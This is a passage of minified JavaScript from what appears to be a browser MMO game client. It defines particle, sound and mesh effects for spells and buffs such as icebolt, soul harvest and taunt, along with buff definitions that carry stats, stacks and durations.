                        this.particle(Mh.blockBuffEnrage, Yo(-1, 1), 0, Yo(-1, 1)))
                }
            },
            plagueSpreaderBuff: {
                particles: {
                    amount: 5,
                    info: Mh.plaguebones
                },
                tick: function (t, e) {
                    this.particles.forEach((e, s) => {
                        if (s >= this.buff.stacks)
                            Vi(e.Za, 0, 0, 0);
                        else {
                            const i = s * (6.28 / this.buff.stacks) + t / 900;
                            this.localize(e.Za, 1.3 * Math.sin(i), .2, 1.3 * Math.cos(i))
                        }
                    }
                    )
                }
            },
            dmgBoostBuff: {
                particles: {
                    amount: 3,
                    info: Mh.dmgBoostFangs
                },
                tick: function (t, e) {
                    0 === this.frame && this.particle(Mh.dmgBoostFangsFlash, 0, 1, 0),
                        this.particles.forEach((e, s) => {
                            const i = s * (6.28 / 3) + t / 900;
                            this.localize(e.Za, 1.4 * Math.sin(i), .2, 1.4 * Math.cos(i))
                        }
                        )
                }
            },
            extraBoltBuff: {
                particles: {
                    amount: 3,
                    info: Mh.extraBoltParticle
                },
                tick: function (t, e) {
                    this.particles.forEach((e, s) => {
                        if (s >= this.buff.stacks)
                            Vi(e.Za, 0, 0, 0);
                        else {
                            const i = s * (6.28 / this.buff.stacks) + t / 900;
                            this.localize(e.Za, 1.1 * Math.sin(i), .2, 1.1 * Math.cos(i))
                        }
                    }
                    )
                }
            },
            temperBuff: {
                tick: function (t, e) {
                    0 === this.frame && dl({
                        distance: 5,
                        id: "warrior/temperbuff",
                        transform: this.transform.parent,
                        dynamic: !0
                    }),
                        this.particle(Mh.dust, Yo(-1, 1), 0, Yo(-1, 1))
                }
            },
            temperBoostBuff: {
                ribbon: {
                    steps: 3,
                    interval: .5,
                    timer: 3,
                    permanent: !0,
                    a: [0, .5, -.5],
                    b: [0, -.5, -.5],
                    Xj: [1, .2, .1, .8],
                    Zw: [1, .2, .1, 0]
                },
                tick: function (t, e) {
                    0 === this.frame && (this.particle(Mh.iceFlash),
                        dl({
                            distance: 7,
                            id: "warrior/temperboostbuff",
                            transform: this.transform.parent,
                            dynamic: !0
                        }),
                        Cf(this, 7, 30, Mh.dust)),
                        this.frame % 10 == 0 && this.particle(Mh.blockFlick, Yo(-1, 1), 0, Yo(-1, 1))
                }
            },
            crescentStrike: {
                Uk: {
                    QY: [1, 1, 1],
                    size: 0,
                    dynamic: !0
                },
                timeout: .5,
                tick: function (t, e) {
                    this.fraction(.1, e) && this.transform.parent.weapon && (this.transform.setParent(this.transform.parent.weapon),
                        this.transform.position[1] = .8);
                    const s = Math.sin(this.time * Math.PI * .5);
                    if (Xn(this.Uk.val, .9 * s, 0, 0, 300),
                        this.fraction(.01, e, this.time % .1)) {
                        const t = this.particle(Mh.crescentStrike, Yo(-1, 1), Yo(.1, .3), Yo(-1, 1));
                        t && mn(t.vel, [-5, 0, 0], this.creature.transform.rotation[1] + this.creature.transform.chest.rotation[1])
                    }
                }
            },
            levelUp: {
                Uk: {
                    QY: [1, 1, 1],
                    size: 0,
                    dynamic: !0
                },
                timeout: 2,
                sound: {
                    distance: 5,
                    id: "levelup",
                    parent: !0
                },
                tick: function (t, e) {
                    const s = 2 * Math.sin(this.time * Math.PI * .5);
                    Xn(this.Uk.val, .9 * s, s, .7 * s, 200),
                        this.fraction(.1, e) && Cf(this, 8, 5, Mh.levelUp)
                }
            },
            icebolt: {
                ribbon: {
                    steps: 3,
                    interval: .4,
                    timer: 15,
                    a: [-.2, 0, 0],
                    b: [.2, 0, 0],
                    Xj: [1, 1, 2.5, 1.5],
                    Zw: [0, .2, 1, 0]
                },
                mesh: {
                    id: "character/spike.ho",
                    color: [1.5, 1.5, 2, -.3],
                    scale: [.4, .4, .4],
                    Za: [0, 0, 0]
                },
                tick: function (t, e) {
                    this.frame % 1 == 0 && (this.particle(Mh.iceBig, Yo(-.15, .15), Yo(-.15, .15), 0),
                        Math.random() < .4 && this.particle(Mh.snowflake, Yo(-.3, .3), Yo(-.3, .3), 0))
                }
            },
            icicle: {
                Uk: {
                    QY: [.2, .5, 1.5],
                    size: 100,
                    dynamic: !0
                },
                mesh: {
                    id: "rocks/rock_02.ho",
                    color: [1.5, 2, 1.5, -.3],
                    scale: [.8, .8, .8],
                    Za: [0, 0, 0]
                },
                tick: function (t, e) {
                    0 === this.frame && dl({
                        distance: 5,
                        id: "mage/iciclecast",
                        transform: this.transform,
                        dynamic: !0
                    }),
                        Vi(this.transform.rotation, 0, t / 150, 0),
                        this.transform.rotationNeedsUpdate = !0,
                        this.transform.updateMatrixWorld(!0),
                        this.frame % 2 == 0 && Cf(this, 5, 10, Mh.icicle, void 0, this.transform.rotation[1])
                }
            },
            icecast: {
                tick: function (t, e) {
                    this.frame % 5 == 0 && this.particle(Mh.iceBig, Yo(-.2, .2), Yo(-.2, .2), Yo(-.2, .2))
                }
            },
            iceimpact: {
                timeout: .001,
                tick: function (t, e) {
                    if (0 === this.frame) {
                        for (let t = 0; t < 20 * this.lod; ++t) {
                            const t = this.particle(Mh.snowflake, Yo(-.4, .4), Yo(-.4, .4), Yo(-.4, .4))
                                , e = Yo(8, 10);
                            t && Vi(t.vel, Yo(-e, e) - 10 * this.dir[0], Yo(-5, e) - 10 * this.dir[1], Yo(-e, e) - 10 * this.dir[2])
                        }
                        dl({
                            distance: 5,
                            id: "mage/iceimpact1",
                            transform: this.transform
                        }),
                            this.creature.transform.addPushBack(this.dir, 4)
                    }
                }
            },
            icicleImpact: {
                timeout: .001,
                tick: function (t, e) {
                    if (0 === this.frame) {
                        for (let t = 0; t < 20 * this.lod; ++t) {
                            const t = this.particle(Yo(0, 1) < .5 ? Mh.iceBig : Mh.snowflake, Yo(-.4, .4), Yo(-.4, .4), Yo(-.4, .4))
                                , e = Yo(5, 10);
                            t && sn(t.vel, [Yo(-e, e), Yo(0, 3), Yo(-e, e)], this.dir, -1)
                        }
                        dl({
                            distance: 8,
                            id: "mage/iciclehit",
                            rnd: 2,
                            transform: this.transform
                        }),
                            this.creature.transform.addPushBack(this.dir, 8)
                    }
                }
            },
            arrow: {
                ribbon: {
                    steps: 3,
                    interval: .2,
                    timer: 15,
                    a: [-.07, 0, -.6],
                    b: [.07, 0, -.6],
                    Xj: [1, 1, 1, 2],
                    Zw: [1, 1, 1, 0]
                },
                mesh: {
                    id: "character/arrow.ho",
                    color: kf.woodbrown,
                    scale: [.35, .35, .35]
                }
            },
            precisearrow: {
                ribbon: {
                    steps: 3,
                    interval: .2,
                    timer: 15,
                    a: [-.15, 0, -.7],
                    b: [.15, 0, -.7],
                    Xj: [1, 1, .5, 2],
                    Zw: [1, 1, .5, 0]
                },
                mesh: {
                    id: "character/arrow.ho",
                    color: kf.white,
                    scale: [.6, .6, .6]
                },
                tick: function (t, e) {
                    this.particle(Mh.precisesparcle)
                }
            },
            swiftarrow: {
                ribbon: {
                    steps: 3,
                    interval: .2,
                    timer: 15,
                    a: [-.06, 0, -.7],
                    b: [.06, 0, -.7],
                    Xj: [.3, .7, 1, 2],
                    Zw: [.3, .7, 1, 0]
                },
                mesh: {
                    color: kf.ice,
                    id: "character/arrow.ho",
                    scale: [.4, .4, .4]
                },
                tick: function (t, e) {
                    this.frame % 2 == 0 && this.particle(Mh.teleportSparkle)
                }
            },
            naturecast: {
                tick: function (t, e) {
                    this.frame % 10 == 0 && (this.particle(Mh.healNatureBig, Yo(-.5, .5), Yo(-.5, .5), Yo(-.5, .5)),
                        Math.random() < .4 && this.particle(Mh.healNatureSparkle, Yo(-.7, .7), Yo(-.3, .7), Yo(-.7, .7)))
                }
            },
            natureHealOneshot: {
                timeout: 1,
                tick: function (t, e) {
                    this.fraction(.01, e) && (dl({
                        distance: 3,
                        id: "shaman/mendImpact",
                        transform: this.transform.parent
                    }),
                        Cf(this, 5, 5, Mh.healNatureBig)),
                        this.fraction(.05, e, this.time % (.05 * this.time + .05)) && (this.particle(Mh.healNatureBig, Yo(-1, 1), Yo(.1, .3), Yo(-1, 1)),
                            this.particle(Mh.healNatureSparkle, Yo(-1, 1), Yo(.1, .3), Yo(-1, 1)))
                }
            },
            revitalize: {
                ribbon: {
                    steps: 10,
                    interval: .06,
                    timer: 5,
                    permanent: !0,
                    a: [1, 0, 0],
                    b: [1.5, 0, 0],
                    repeat: 1,
                    Xj: [.1, 1, .8, 0],
                    Zw: [.3, 1, .5, 1.1]
                },
                sound: {
                    distance: 2,
                    id: "shaman/revitalizeBuff",
                    parent: !0
                },
                tick: function (t, e) {
                    Vi(this.transform.rotation, .6 * Math.cos(t / 200), t / 130, .6 * Math.sin(t / 243)),
                        this.frame % 10 == 0 && (this.particle(Mh.healNatureBig, Yo(.9, 1.6), Yo(-.1, .1), Yo(-.1, .1)),
                            Math.random() < .4 && this.particle(Mh.healNatureSparkle, Yo(.9, 1.6), Yo(-.1, .1), Yo(-.1, .1)))
                }
            },
            serpentBuff: {
                tick: function (t, e) {
                    0 === this.frame && this.particle(Mh.serpentBuffFocus),
                        this.frame % 3 == 0 && this.particle(Mh.serpentBuff, Math.sin(t / 300), .3 * Math.sin(t / 100), Math.cos(t / 300))
                }
            },
            bleedDebuff: {
                particles: {
                    amount: 3,
                    info: Mh.bloodFloat
                },
                tick: function (t, e) {
                    this.particles.forEach((e, s) => {
                        const i = 2 * s + t / 1e3;
                        this.localize(e.Za, Math.sin(i), .3, Math.cos(i))
                    }
                    )
                }
            },
            invigorateBuff: {
                particles: {
                    amount: 1,
                    info: Mh.invigorateBuff
                },
                tick: function (t, e) {
                    this.particles.length > 0 && this.localize(this.particles[0].Za, 0, .5, 0, 0, .5 + .1 * Math.sin(t / 100))
                }
            },
            hypothermicBuff: {
                particles: {
                    amount: 1,
                    info: Mh.hypothermicBuff
                },
                tick: function (t, e) {
                    0 === this.frame && this.particle(Mh.iceFlash),
                        this.particles.length > 0 && this.localize(this.particles[0].Za, 0, .5, 0, 0, .5 + .1 * Math.sin(t / 100))
                }
            },
            gainMana: {
                timeout: .3,
                tick: function (t, e) {
                    this.frame % 3 == 0 && this.particle(Mh.manaGain, Yo(-1, 1), Yo(.1, .3), Yo(-.9, .9))
                }
            },
            blueMarble: {
                particles: {
                    amount: 3,
                    info: Mh.blueMarble
                },
                tick: function (t, e) {
                    0 === this.frame && this.particle(Mh.blueMarbleFlash, 0, 1, 0),
                        this.particles.forEach((e, s) => {
                            this.localize(e.Za, .3 * Math.sin(t / 500 + 2 * s), .3, .3 * Math.cos(t / 500 + 2 * s))
                        }
                        )
                }
            },
            gainHealth: {
                timeout: .3,
                tick: function (t, e) {
                    this.frame % 3 == 0 && this.particle(Mh.healHolySparkle, Yo(-1, 1), Yo(.1, .3), Yo(-.9, .9))
                }
            },
            soulHarvestCast: {
                timeout: .8,
                tick: function (t, e) {
                    if (0 === this.frame)
                        for (let t = 0; t < 2 * Math.PI; t += hr / 10) {
                            const e = Math.sin(t)
                                , s = Math.cos(t);
                            Nh(Mh.soulHarvested, void 0, this.transform.parent.position[0] + 10 * e, this.transform.parent.position[1], this.transform.parent.position[2] + 10 * s, -10 * e, 0, -10 * s, !1)
                        }
                }
            },
            soulHarvestMissile: {
                ribbon: {
                    steps: 3,
                    interval: .4,
                    timer: 15,
                    a: [-.2, 0, 0],
                    b: [.2, 0, 0],
                    Xj: [0, .6, 1.8, 2],
                    Zw: [0, .4, .8, 0]
                },
                mesh: {
                    id: "misc/misc_bones_skull.ho",
                    color: [.7, 1, 1.2, -.4],
                    scale: [.3, .3, .3],
                    Za: [0, 0, 0]
                },
                tick: function (t, e) {
                    this.frame % 3 == 0 && this.particle(this.frame % 2 == 0 ? Mh.souls : Mh.soulCloud, Yo(-.3, .3), 0, Yo(-.3, .3))
                }
            },
            soulHarvestImpact: {
                timeout: 1,
                tick: function (t, e) {
                    this.fraction(.01, e) && (dl({
                        delay: .2,
                        rndDelay: !0,
                        distance: 5,
                        id: "shaman/soulHarvestImpact",
                        transform: this.creature.transform
                    }),
                        this.creature.transform.addPushBack(this.dir, 6),
                        Cf(this, 5, 5, Mh.souls))
                }
            },
            soulHarvestReturn: {
                timeout: 1,
                tick: function (t, e) {
                    this.fraction(.01, e) && (dl({
                        delay: .3,
                        rndDelay: !0,
                        distance: 4,
                        id: "shaman/soulHarvestReturnCollect",
                        transform: this.creature.transform
                    }),
                        this.creature.transform.addPushBack(this.dir, 3),
                        this.particle(Mh.soulHarvested, 0, -.5, 0, 0, 2, 0))
                }
            },
            decayMissile: {
                ribbon: {
                    steps: 3,
                    interval: .4,
                    timer: 15,
                    a: [-.2, 0, 0],
                    b: [.2, 0, 0],
                    Xj: [0, 2, .4, 1.5],
                    Zw: [0, 1, .4, 0]
                },
                mesh: {
                    id: "misc/misc_bones_skull.ho",
                    color: [.6, .8, .35, -.1],
                    scale: [.4, .4, .4],
                    Za: [0, 0, 0]
                },
                tick: function (t, e) {
                    this.particle(this.frame % 2 == 0 ? Mh.skulls : Mh.decayCloud, Yo(-.3, .3), 0, Yo(-.3, .3))
                }
            },
            decay: {
                particles: {
                    amount: 1,
                    info: Mh.decay
                },
                sound: {
                    distance: 5,
                    id: "shaman/decayOnBuff",
                    parent: !0
                },
                tick: function (t, e) {
                    this.frame % 7 == 0 && this.particle(Yo(0, 1) < .5 ? Mh.decaySoft : Mh.skulls, Yo(-1, 1), Yo(-.3, .5), Yo(-1, 1)),
                        0 !== this.particles.length && this.localize(this.particles[0].Za, 0, 0, 0, 0, 1)
                }
            },
            decayImpact: {
                timeout: .001,
                tick: function (t, e) {
                    0 === this.frame && (Cf(this, 5, 5, Mh.skulls),
                        dl({
                            distance: 5,
                            id: "shaman/decayHit",
                            transform: this.transform
                        }),
                        this.creature.transform.addPushBack(this.dir, 4))
                }
            },
            poisonImpact: {
                timeout: .001,
                tick: function (t, e) {
                    0 === this.frame && (Cf(this, 5, 5, Mh.poison),
                        dl({
                            distance: 5,
                            id: "shaman/decayHit",
                            transform: this.transform
                        }),
                        this.creature.transform.addPushBack(this.dir, 4))
                }
            },
            manaBuff: {
                particles: {
                    amount: 3,
                    info: Mh.mimir
                },
                tick: function (t, e) {
                    0 === this.frame && Cf(this, 5, 5, Mh.manaGain),
                        this.particles.forEach((e, s) => {
                            const i = t / 600 + .3 * Math.sin(s + t / 300);
                            this.localize(e.Za, 1.2 * Math.sin(i), .2 * Math.sin(3 * i), 1.2 * Math.cos(i), 0, .2)
                        }
                        )
                }
            },
            courageBuff: {
                particles: {
                    amount: 1,
                    info: Mh.courage
                },
                tick: function (t, e) {
                    0 === this.frame && this.particle(Mh.courageFlash),
                        this.particles.length > 0 && this.localize(this.particles[0].Za, .9 * Math.sin(Ua.smoothtime), .3, .9 * Math.cos(Ua.smoothtime))
                }
            },
            warcryBuff: {
                particles: {
                    amount: 1,
                    info: Mh.warcry
                },
                tick: function (t, e) {
                    if (0 === this.frame && this.particle(Mh.warcryFlash),
                        this.particles.length > 0) {
                        const t = Ua.smoothtime + 3;
                        this.localize(this.particles[0].Za, .9 * Math.sin(t), .3, .9 * Math.cos(t))
                    }
                }
            },
            icenova: {
                timeout: .001,
                tick: function (t, e) {
                    0 === this.frame && (this.particle(Mh.iceFlash),
                        Cf(this, 15, 20, Mh.icenova),
                        Cf(this, 12, 20, Mh.snowflake),
                        dl({
                            delay: .1,
                            distance: 5,
                            id: "mage/icenovacast",
                            transform: this.transform.parent
                        }))
                }
            },
            icenovaroot: {
                mesh: {
                    id: "engine/dome.ho",
                    color: kf.ice,
                    scale: [2, 2, 2],
                    Za: [0, -.9, 0]
                },
                tick: function (t, e) {
                    0 === this.frame && (Cf(this, 8, 15, Mh.snowflake),
                        dl({
                            delay: Yo(.2, .4),
                            distance: 5,
                            id: "mage/icenovafreeze",
                            transform: this.transform.parent
                        }))
                }
            },
            deepfrozen: {
                mesh: {
                    id: "character/spike.ho",
                    color: kf.ice,
                    scale: [1.5, 1.5, .7],
                    Za: [0, -.5, 0],
                    rot: [1.54, 0, 0]
                },
                tick: function (t, e) {
                    0 === this.frame && (Cf(this, 8, 10, Mh.frostflake),
                        dl({
                            delay: Yo(.2, .4),
                            distance: 5,
                            id: "mage/deepfreezebuff",
                            transform: this.transform.parent
                        }))
                }
            },
            frozen: {
                tick: function (t, e) {
                    0 === this.frame && (Cf(this, 5, 6, Mh.frostflake),
                        dl({
                            delay: Yo(.2, .4),
                            distance: 5,
                            id: "mage/icenovafreeze",
                            transform: this.transform.parent
                        }))
                }
            },
            enchantment: {
                particles: {
                    amount: 4,
                    info: Mh.enchant
                },
                tick: function (t, e) {
                    0 === this.frame && this.particle(Mh.enchantFlash),
                        this.transform.parent.hands && this.transform.parent.hands[0].visible ? this.particles.forEach((t, e) => {
                            In(t.Za, this.transform.parent.hands[e % 2].KP);
                            const s = .7 * e + Ua.smoothtime;
                            t.Za[0] += .15 * Math.sin(s),
                                t.Za[2] += .15 * Math.cos(s)
                        }
                        ) : this.particles.forEach(pd)
                }
            },
            arcticaura: {
                particles: {
                    amount: 2,
                    info: Mh.arcticaura
                },
                tick: function (t, e) {
                    0 === this.frame && this.particle(Mh.arcticFlash),
                        this.particles.forEach((t, e) => {
                            t.GF = Math.sin(Ua.smoothtime);
                            const s = 3 * e + Ua.smoothtime;
                            this.localize(t.Za, .15 * Math.sin(s), .5, .15 * Math.cos(s))
                        }
                        )
                }
            },
            incomingDmgReduceAura: {
                particles: {
                    amount: 2,
                    info: Mh.whiteAura
                },
                tick: function (t, e) {
                    0 === this.frame && this.particle(Mh.hardenedEggFlash, 0, 1, 0),
                        this.particles.forEach((t, e) => {
                            t.GF = Math.sin(Ua.smoothtime);
                            const s = 3 * e + Ua.smoothtime;
                            this.localize(t.Za, .15 * Math.sin(s), .5, .15 * Math.cos(s))
                        }
                        )
                }
            },
            moveBoost: {
                ribbon: {
                    steps: 5,
                    interval: .25,
                    timer: 5,
                    permanent: !0,
                    a: [0, .5, -.5],
                    b: [0, -.5, -.5],
                    uvTop: .5,
                    Xj: [.6, 0, 1, 1],
                    Zw: [.6, 0, 1, 0]
                },
                tick: function (t, e) {
                    0 === this.frame && (this.particle(Mh.moveBoostFlash, 0, 1, 0),
                        this.ribbon.parent = this.transform.parent.chest || this.transform.parent)
                }
            },
            pathfinding: {
                ribbon: {
                    steps: 5,
                    interval: .25,
                    timer: 5,
                    permanent: !0,
                    a: [0, .5, -.5],
                    b: [0, -.5, -.5],
                    Xj: [1, 1, 1, .8],
                    Zw: [1, 1, 1, 0]
                },
                tick: function (t, e) {
                    this.frame % 5 == 0 && this.frame < 20 && this.particle(Mh.pathfindFlash),
                        0 === this.frame && (this.ribbon.parent = this.transform.parent.chest || this.transform.parent)
                }
            },
            temporaldilation: {
                particles: {
                    amount: 2,
                    info: Mh.temporal
                },
                tick: function (t, e) {
                    this.frame % 5 == 0 && this.frame < 20 && this.particle(Mh.temporalFlash),
                        this.particles.forEach((t, e) => {
                            t.GF = Math.sin(Ua.smoothtime);
                            const s = 3 * e + 3 * Ua.smoothtime;
                            this.localize(t.Za, Math.sin(s), .2, Math.cos(s))
                        }
                        )
                }
            },
            caninehowl: {
                particles: {
                    amount: 1,
                    info: Mh.canine
                },
                tick: function (t, e) {
                    0 === this.frame && this.particle(Mh.canineFlash),
                        0 !== this.particles.length && this.localize(this.particles[0].Za, 0, 0, 0, 0, .6)
                }
            },
            poisonarrows: {
                sound: {
                    distance: 5,
                    id: "shaman/decayOnBuff",
                    parent: !0
                },
                tick: function (t, e) {
                    this.frame % 7 == 0 && this.particle(Yo(0, 1) < .5 ? Mh.poisonSoft : Mh.poison, Yo(-1, 1), Yo(-.3, .5), Yo(-1, 1))
                }
            },
            healingtotem: {
                Uk: {
                    QY: [.8, 1.5, .5],
                    size: 300,
                    dynamic: !0
                },
                mesh: {
                    id: "misc/misc_palisade_solo.ho",
                    color: kf.woodbrown,
                    scale: [.4, .6, .4],
                    Za: [0, -.8, 0]
                },
                tick: function (t, e) {
                    if (this.frame % 10 == 0 && this.particle(Mh.healHolySoft, Yo(-5, 5), Yo(.1, .3), Yo(-5, 5)),
                        this.frame % 5) {
                        const e = t / 300
                            , s = this.particle(Mh.totemfloater, 10 * Math.cos(e), 1, 10 * Math.sin(e));
                        s && (s.Za[1] = Ua.getHeight(s.Za[0], s.Za[2]) + 1)
                    }
                }
            },
            gainHealthTotem: {
                timeout: .1,
                tick: function (t, e) {
                    this.frame % 3 == 0 && this.particle(Mh.healNatureBlink, Yo(-.8, .8), Yo(.1, .3), Yo(-.8, .8))
                }
            },
            teleport: {
                timeout: .001,
                tick: function (t, e) {
                    if (0 === this.frame) {
                        this.particle(Mh.teleportFlash);
                        for (let t = 0; t < 3; ++t)
                            this.particle(Mh.teleportSparkle, Yo(-.6, .6), 1, Yo(-.6, .6));
                        dl({
                            delay: .1,
                            distance: 5,
                            id: "mage/teleportcast",
                            transform: this.transform.parent
                        })
                    }
                }
            },
            stunned: {
                sound: {
                    loop: !1,
                    parent: !0,
                    id: "stundebuff",
                    distance: 10
                },
                particles: {
                    amount: 3,
                    info: Mh.stun
                },
                tick: function (t, e) {
                    this.particles.forEach((e, s) => {
                        const i = 2 * s + t / 250;
                        this.localize(e.Za, 1.2 * Math.sin(i), .2, 1.2 * Math.cos(i), 0, .2, 0)
                    }
                    )
                }
            },
            dazed: {
                sound: {
                    loop: !1,
                    parent: !0,
                    id: "stundebuff",
                    distance: 10
                },
                particles: {
                    amount: 3,
                    info: Mh.daze
                },
                tick: function (t, e) {
                    this.particles.forEach((e, s) => {
                        const i = 2 * s + t / 350;
                        this.localize(e.Za, .8 * Math.sin(i), .2, .8 * Math.cos(i), 0, .2, 0)
                    }
                    )
                }
            },
            charge: {
                sound: {
                    loop: !1,
                    parent: !0,
                    id: "warrior/chargecast",
                    distance: 9
                },
                ribbon: {
                    steps: 5,
                    interval: .25,
                    timer: 5,
                    permanent: !0,
                    a: [-.5, 0, -.5],
                    b: [.5, 0, -.5],
                    Xj: [2, 1.5, .5, 1.2],
                    Zw: [2, .8, 1, 0]
                },
                tick: function (t, e) {
                    this.frame % 5 == 0 && this.particle(Mh.chargeFlash)
                }
            },
            taunt: {
                timeout: .8,
                tick: function (t, e) {
                    if (this.frame % 10 == 0 && this.particle(Mh.tauntFlash),
                        0 === this.frame) {
                        for (let t = 0; t < 2 * Math.PI; t += hr / 10) {
                            const e = Math.sin(t)
                                , s = Math.cos(t);
                            Nh(Mh.tauntsparkle, void 0, this.transform.parent.position[0] + 10 * e, this.transform.parent.position[1], this.transform.parent.position[2] + 10 * s, -50 * e, 0, -50 * s, !1)
                        }
                        dl({
                            delay: .05,
                            distance: 8,
                            id: "warrior/tauntcast",
                            transform: this.transform.parent
                        })
                    }
                }
            },
            transformation: {
                tick: function (t, e) {
                    if (0 === this.frame) {
                        this.particle(Mh.teleportFlash);
                        for (let t = 0; t < 8; ++t)
                            this.particle(Mh.teleportSparkle, 0, 0, 0, Yo(-5, 5), Yo(-5, 5), Yo(-5, 5))
                    }
                    this.frame % 20 == 0 && (this.particle(Mh.transformationAura, 0, 0, this.transform.parent.entity ? 1.5 * this.transform.parent.entity.steer[1] : 0),
                        this.particle(Mh.transformSoft, 0, 0, 3 * this.transform.parent.entity.steer[1]))
                }
            },
            snipe: {
                sound: {
                    loop: !1,
                    parent: !0,
                    id: "archer/snipeCast",
                    delay: .2,
                    distance: 7
                },
                particles: {
                    amount: 1,
                    info: Mh.snipe
                },
                tick: function (t, e) {
                    0 !== this.particles.length && (this.frame % 3 == 0 && this.time < .3 && this.particle(Mh.dust, Yo(-.3, .3), Yo(-.3, .3), 0),
                        this.transform.parent.hands && this.transform.parent.hands[1].visible ? In(this.particles[0].Za, this.transform.parent.hands[1].KP) : pd(this.particles[0]))
                }
            },
            etherwyrm: {
                tick: function (t, e) {
                    this.frame % 7 == 0 && this.particle(Mh.etherglow, Yo(-.8, .8), Yo(-.3, .5), Yo(-.8, .8))
                }
            },
            shadowwyrm: {
                tick: function (t, e) {
                    this.frame % 7 == 0 && this.particle(Mh.shadowglow, Yo(-1, 1), Yo(-.3, .5), Yo(-1, 1))
                }
            },
            burning: {
                tick: function (t, e) {
                    this.frame % 4 == 0 && this.particle(Mh.fire, Yo(-1, 1), Yo(-.3, .5), Yo(-1, 1))
                }
            },
            postsummon: {
                sound: {
                    loop: !1,
                    parent: !0,
                    id: "magic/summonaccept",
                    delay: .05,
                    distance: 7
                },
                tick: function (t, e) {
                    0 === this.frame && (this.particle(Mh.summonFlash, 0, 0, 0),
                        Cf(this, 10, 8, Mh.summonSparkle)),
                        this.frame % 10 == 0 && this.particle(Mh.summonSparkle, Yo(-.3, .3), Yo(-.3, .5), Yo(-.3, .3))
                }
            },
            purplecast: {
                tick: function (t, e) {
                    this.frame % 10 == 0 && this.particle(Mh.summonSparkle, Yo(-.2, .2), Yo(-.2, .2), Yo(-.2, .2))
                }
            }
        }
        , Cf = (t, e, s, i, n = [0, 0, 0], a = 0) => {
            for (let r = 0; r < 2 * Math.PI; r += hr / e)
                t.particle(i, n[0], n[1], n[2], Math.sin(r + a) * s, 0, Math.cos(r + a) * s)
        }
        ;
    var Tf = new vf({
        id: 44,
        icon: "skills/2",
        fx: {
            stick: _f.blockBuff,
            startSound: {
                id: "warrior/buffBlock",
                distance: 5
            }
        },
        statsStatic: (t, e) => {
            e.addStat(13, 300 + 40 * t.level)
        }
        ,
        onBlock: (t, e) => ({
            id: 45,
            mode: 5,
            stacks: 1,
            duration: 8,
            caster: e.id,
            target: e.id,
            refresh: !0,
            level: t.level
        })
    })
        , Pf = new vf({
            id: 45,
            maxStacks: 8,
            icon: "skills/buffBlock",
            fx: {
                stick: _f.blockEnrageBuff
            },
            statsStatic: (t, e) => {
                e.addStat(24, t.stacks * (2 * t.level + 2))
            }
        });
    const If = (t, e) => {
        if (t.static)
            return !1;
        const s = Od(2 * e.data[0], 768)
            , i = [s[0] - t.Za[0], s[1] - t.Za[2]];
        return t.setXZPos(yr(Ya, t.Za)),
            Ea(i) > t.size ? (t.setSteer([0, 1]),
                t.setRot(mr(i)),
                t.setJump(0),
                !0) : (t.setSteer([0, 0]),
                    !1)
    }
        ;
    var Df = new vf({
        id: 73,
        incapacitated: !0,
        icon: "skills/33",
        fx: {
            stick: _f.charge,
            endSound: {
                id: "warrior/chargeimpact",
                distance: 10
            }
        },
        statsOverride: (t, e) => {
            e.stat.set(15, 250)
        }
        ,
        movementOverride: (t, e, s, i, n) => {
            If(i, n)
        }
    })
        , Af = new vf({
            id: 62,
            icon: "skills/20",
            fx: {
                stick: _f.courageBuff,
                startSound: {
                    id: "warrior/couragecast",
                    distance: 5
                }
            },
            diminish: !0,
            statsStatic: (t, e) => {
                e.addStat(12, Math.round((10 + t.level ** 1.1 * 20) * t.diminishFactor))
            }
        })
        , Bf = new vf({
            id: 59,
            passive: !0,
            icon: "skills/17",
            custom: [[t => 93 + 32 * t, "% as additional damage over 10 seconds"]],
            afterDamageEnemy: {
                3: (t, e, s) => { }
            }
        })
        , Rf = new vf({
            id: 60,
            type: 1,
            tags: new Set([1]),
            maxStacks: 3,
            icon: "skills/18",
            fx: {
                effectDirImpact: [_f.meleeSlash],
                stick: _f.bleedDebuff,
                color: [.7, .1, .1, .5]
            },
            intervalDuration: 1.5,
            onInterval: (t, e, s) => ({
                id: 18,
                mode: 1,
                caster: t.caster,
                target: e.id,
                dmg: t.level * t.stacks,
                noDaze: !0,
                type: 1
            })
        })
        , zf = new vf({
            id: 58,
            icon: "skills/17",
            fx: {
                stick: _f.healOnBlockBuff,
                stickOffset: .5,
                startSound: {
                    id: "warrior/healOnBlockCast",
                    distance: 5
                }
            },
            onBlock: (t, e) => ({
                id: 17,
                mode: 2,
                caster: t.caster,
                target: e.id,
                heal: 7 + 14 * t.level
            })
        })
        , Ff = new vf({
            id: 47,
            passive: !0,
            icon: "skills/8",
            statsConvert: [[0, .3, 10], [0, .3, 11], [0, .3, 8]]
        })
        , Zf = new vf({
            id: 75,
            incapacitated: !0,
            type: 1,
            tags: new Set([6]),
            visualIncapacitation: !0,
            icon: "skills/34",
            fx: {
                stick: _f.stunned,
                stickOffset: .5
            },
            statsOverride: (t, e) => {
                e.stat.get(15) > 30 && e.stat.set(15, 30)
            }
            ,
            movementOverride: (t, e, s, i, n) => {
                If(i, n)
            }
        })
        , Uf = new vf({
            id: 92,
            maxStacks: 3,
            icon: "skills/temperBoostBuff",
            fx: {
                stick: _f.temperBoostBuff,
                color: [.2, .2, .25, .95],
                norefresh: !0
            },
            statsStatic: (t, e) => {
                e.addStat(15, 20)
            }
        })
        , Lf = new vf({
            id: 91,
            maxStacks: 3,
            tags: new Set([3, 4]),
            icon: "skills/41",
            fx: {
                stick: _f.temperBuff,
                color: [.1, .1, .1, .92],
                norefresh: !0
            },
            statsStatic: (t, e) => {
                e.addStat(26, 25 * t.stacks)
            }
            ,
            intervalDuration: .5,
            onInterval: (t, e, s) => !0
        })
        , Nf = new vf({
            id: 61,
            icon: "skills/19",
            fx: {
                stick: _f.warcryBuff,
                startSound: {
                    id: "warrior/warcrycast",
                    distance: 5
                }
            },
            diminish: !0,
            statsStatic: (t, e) => {
                e.addStat(10, Math.round(3 * t.level * t.diminishFactor)),
                    e.addStat(11, Math.round(4 * t.level * t.diminishFactor)),
                    e.addStat(6, Math.round(50 * t.level * t.diminishFactor))
            }
        });
    class Of extends Jn {
        constructor(t) {
            super(),
                this.sounds = t.sounds || {},
                this.entity = t.entity,
                this.cycleOne = Math.random(),
                this.cycleRad = Yo(0, 1),
                this.cycleSin = 0,
                this.speed = 1,
                this.meshes = [],
                this.lastFlags = 0,
                this.deathTimer = new fh(0, 3),
                this.hurtSoundTimer = new fh(0, 5),
                this.idleSoundTimer = new fh(Ua.time + Yo(0, 20), 20),
                this.pushBack = [0, 0],
                this.pushBackVel = [0, 0],
                this.pushBackOffset = [0, 0],
